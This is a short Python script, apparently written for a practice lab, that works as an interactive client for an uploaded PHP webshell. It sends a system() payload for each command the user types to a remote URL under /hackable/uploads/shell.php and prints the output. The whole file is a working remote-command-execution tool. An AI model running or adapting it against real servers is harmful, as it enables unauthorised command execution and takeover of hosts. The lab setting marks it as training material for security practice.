import requests

url = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/hackable/uploads/shell.php"
password = "pass"

def run_cmd(cmd):
    # system()执行系统命令
    payload = f"system('{cmd}');"
    data = {password: payload}
    try:
        resp = requests.post(url, data=data, timeout=10)
        return resp.text
    except Exception as e:
        return f"出错:{e}"

if __name__ == "__main__":
    print("靶场webshell交互，输入quit退出")
    while True:
        cmd = input("> ")
        if cmd.strip() == "quit":
            break
        res = run_cmd(cmd)
        print(res)